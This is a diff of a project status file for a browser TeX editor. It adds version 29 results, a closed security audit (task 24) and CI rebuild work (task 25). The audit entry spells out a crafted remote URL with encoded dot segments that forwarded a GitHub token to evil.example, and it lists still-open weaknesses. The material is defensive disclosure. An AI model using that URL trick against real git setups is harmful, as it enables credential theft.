@@ -5,16 +5,16 @@ Read the rules at the end before the first commit.
 
 ## Where it stands
 
-| check | v19 (published 2026-10-12) | version 23 (published 2026-10-26) | version 25 (2026-10-28) | version 28 (2026-10-29) |
-|---|---|---|---|---|
-| corpus compiles (LaTeX-examples, 716 documents present) | 705 | 706 | 706 | as version 25 |
-| corpus PDFs equal to a desktop TeX Live 2026's | 615 of 704 (87.4 %) | 700 of 705 (99.3 %) | 703 of 705 (99.7 %) | as version 25 |
-| TeX passes over the whole corpus | not counted | 995 (1,471 without latexmk's first-run `.aux`) | 995 | as version 25 |
-| `test/engines.py` | 22/22 | 22/22 (its PSTricks check now asks for drawn lines) | 22/22 | 23/23 (a check that pygmentize loads no code a document wrote) |
-| `tex/native/xindy/test.cjs` (against CLISP's xindy) | 11/11 | 11/11 | 11/11 | 11/11 |
-| TeX Live's 220 Asymptote examples as a desktop's asy draws them | not measured | against a native asy 3.09: 216 (196 equal PDFs, 12 equal failures, 7 random by design, 1 equal alone); 4 open | against the desktop's asy 3.11: 218 (201 equal PDFs, the 3D ones rendered as bitmaps; 10 equal failures; 7 random by design); 2 open: 1 numerical, `slope` out of memory | as version 25 |
-| edits on the typeset page landing exactly, undone byte for byte (`test/editor_corpus.py`) | not measured | 780 of 780, in the 222 documents with text, a formula, a cell or a footnote; 211 of 211 edited projects compile | as version 23 (page unchanged) | 781 of 792 land, 11 open as source by design, all 792 undone byte for byte, on the complete corpus; 211 of 211 edited projects compile |
-| artifact size (limit 256 MB) | 250.0 MB | 249.7 MB | 252.3 MB | 253.1 MB (with the 0.8 MB license bundle) |
+| check | v19 (published 2026-10-12) | version 23 (published 2026-10-26) | version 25 (2026-10-28) | version 28 (2026-10-29) | version 29 (2026-11-09) |
+|---|---|---|---|---|---|
+| corpus compiles (LaTeX-examples, 716 documents present) | 705 | 706 | 706 | as version 25 | as version 25 |
+| corpus PDFs equal to a desktop TeX Live 2026's | 615 of 704 (87.4 %) | 700 of 705 (99.3 %) | 703 of 705 (99.7 %) | as version 25 | as version 25 |
+| TeX passes over the whole corpus | not counted | 995 (1,471 without latexmk's first-run `.aux`) | 995 | as version 25 | as version 25 |
+| `test/engines.py` | 22/22 | 22/22 (its PSTricks check now asks for drawn lines) | 22/22 | 23/23 (a check that pygmentize loads no code a document wrote) | 23/23, now run by CI on a tree built there (`tex.yml`) |
+| `tex/native/xindy/test.cjs` (against CLISP's xindy) | 11/11 | 11/11 | 11/11 | 11/11 | 11/11 |
+| TeX Live's 220 Asymptote examples as a desktop's asy draws them | not measured | against a native asy 3.09: 216 (196 equal PDFs, 12 equal failures, 7 random by design, 1 equal alone); 4 open | against the desktop's asy 3.11: 218 (201 equal PDFs, the 3D ones rendered as bitmaps; 10 equal failures; 7 random by design); 2 open: 1 numerical, `slope` out of memory | as version 25 | as version 25 |
+| edits on the typeset page landing exactly, undone byte for byte (`test/editor_corpus.py`) | not measured | 780 of 780, in the 222 documents with text, a formula, a cell or a footnote; 211 of 211 edited projects compile | as version 23 (page unchanged) | 781 of 792 land, 11 open as source by design, all 792 undone byte for byte, on the complete corpus; 211 of 211 edited projects compile | as version 28 (model and parser unchanged) |
+| artifact size (limit 256 MB) | 250.0 MB | 249.7 MB | 252.3 MB | 253.1 MB (with the 0.8 MB license bundle) | 253.6 MB (pdf.js shipped, IBM Plex inlined) |
 
 Version 23 changed only the page (task 13): its `dist/tex` is version 22's byte for byte, so the
 TeX rows are version 22's runs. Version 24 changed Asymptote (tasks 17 and 18: `asy.wasm`, the
@@ -31,6 +31,12 @@ Version 28 (2026-10-29) is the one attacked before going public (task 22). Its T
 version 25's but for gnuplot, which only says 2-rikuy in its version now, so the corpus and
 Asymptote rows are version 25's runs; the page, the worker's scripts and the license bundle
 changed.
+
+Version 29 (2026-11-09) closes the security audit of 2026-11-06 and what an independent review of
+its fixes found (task 24), and has CI rebuild what was only rebuilt by hand (task 25). Its TeX
+tree is version 28's: of `dist/tex`, only `engine.js` changed and `pdf.min.mjs` was added, so the
+corpus, Asymptote and editor rows are earlier runs; `test/engines.py` and `test/pdf.py` ran on a
+tree CI built from the pinned inputs, equal to `dev/dist-manifest.txt` byte for byte.
 
 Equal means: the same number of pages, the same text on each page (`pdftotext -layout`,
 whitespace collapsed), and no page with more than 0.1 % of its pixels differing by more than
@@ -402,10 +408,64 @@ Tests:
     XeLaTeX and LuaLaTeX of TeX Live 2023 (Debian); this machine has no TeX Live 2026 tree, so
     Rikuy's PDF pane did not compile them.
 
+24. **The security audit of 2026-11-06, closed.** Done in version 29 (pull request 1). The audit's
+    findings: pdf.js was imported from jsDelivr with no integrity hash, now shipped beside its
+    worker (`dist/tex/pdf.min.mjs`); one git token went to whatever remote a project named, now one
+    per host, sent only there, with push, pull and clone naming their address and proxy so an
+    opened `.git/config`'s `pushurl` or `http.corsProxy` cannot redirect them; mirror packs are
+    checked against their index hash before they are cached and when read back; file names with
+    `..` or NUL are refused in the worker. An independent review of those fixes then found:
+    - **The host check was bypassable.** isomorphic-git requested a remote as written, through the
+      CORS proxy as proxy/<host>/<path>, and the browser resolves dot segments in that path:
+      `https://github.com/alice/%2e%2e/%2e%2e/evil.example/paper.git` got github.com's token and
+      was forwarded to evil.example. Remotes are now used in their parsed form, and one with a
+      user name, query or fragment is refused (`canonicalRemote`, `src/gitauth.js`).
+    - **The old single token was still filled in for any address typed**, and a stranger's server
+      "accepts" it by answering 401 then 200. It is filled in only for the host its prefix names
+      (`ghp_`, `github_pat_`: GitHub; `glpat-`: GitLab; `olp_`: Overleaf); otherwise a button
+      offers it, naming the host.
+    - Push and pull followed an opened config's `branch.<name>.merge`; they name the branch now.
+    The audit's hardening items, done too: a widget's window loses WebRTC before its scripts run,
+    and frames it adds are removed, with the page refusing data: and blob: frames (`frame-src
+    'self'`), since Chromium ignores CSP's `webrtc` directive; IBM Plex, the interface font, is
+    inlined from npm (`@fontsource`, OFL) instead of loaded from Google Fonts on every visit;
+    the git test server answers only the test page's origin; binaryen is fetched by hash;
+    `arxiv.yml` installs pip packages by hash, unpacks sources safely and compiles papers as an
+    unprivileged user with no network, no sudo and the runner's processes hidden
+    (`dev/sandbox.sh`, checked by `dev/sandbox_check.py` before any paper runs).
+    Evidence: `npm test` (with `test/gitauth.test.mjs` 8/8, `test/engine.test.mjs` 5/5,
+    `test/arxiv_unpack.py` 10/10); `test/browser.py` 92/92, git 42/42, widgets 60/60, share 46,
+    files 30, features 36, history 39, paste 22, wordmath 83, mathfield 19, eqextras 18, frontier
+    13; `test/engines.py` 23/23 and `test/pdf.py` 20/20 in CI's TeX job. Every check added for a
+    finding fails on the build before its fix; the dot segment one sees the token reach the
+    other host through a logging proxy. Still open: a widget can reach WebRTC through a srcdoc
+    frame inside a shadow root the HTML parser makes (`<template shadowrootmode>`,
+    `document.write`, `setHTMLUnsafe`), so the one click gate for widgets from someone else stays
+    the control (docs/ARCHITECTURE.md, Live figures); a symlink made by LuaTeX's `lfs.link` during
+    a compile is not checked by the path guard (not shown to be reachable); the mirror's pack
+    hashes are 64 bits, which a second preimage needs about 2^64 / packs trials to beat, and the
+    mirror's index comes from the page's own site; Latin Extended letters in the interface fall
+    back to a system font (the inlined Plex is cut to Latin and Latin-1).
+
+25. **CI rebuilds what was rebuilt only by hand.** Done. `.github/workflows/tex.yml` lays out the
+    inputs from the pinned downloads, builds the tree and packs, diffs `dist/tex` against
+    `dev/dist-manifest.txt`, then runs `test/engines.py` and `test/pdf.py`, whenever the TeX side
+    or its tests change; `dist/` is kept a week as a workflow artifact. Its first run gave the
+    manifest byte for byte, on a machine other than the one the tree was first built on.
+    `.github/workflows/vendor.yml` rebuilds dvips, gnuplot, xindy and asy (with Mesa, GSL, FFTW,
+    Eigen) from an empty `RIKUY_SRC` and compares every file of `tex/vendor/` by SHA-256. Its
+    first run found two ways the build still depended on the machine (asy's configure called
+    `kpsewhich`; xindy's embedded files went in in file system order) and `tex/build_tools.sh`
+    fixes both; then all 532 files equal the committed ones (dvips 2, gnuplot 2, xindy 431, asy
+    97). The asy job takes about 42 minutes. `test/wordmath.py` no longer waits with
+    `wait_for_function`, which the host's policy failed one run in three.
+
 ## Open tasks
 
 16. **The arXiv corpus** (task 3's finish line): compile rate and match rate on the 1,000
-    papers, every failure classified as in task 2. Needs arxiv.org (see task 3).
+    papers, every failure classified as in task 2. Needs arxiv.org (see task 3). The owner runs
+    it once the repository is public, where Actions minutes are free; `arxiv.yml` is ready
+    (task 24 hardened it) but has never run.
 
 ## Rules
 
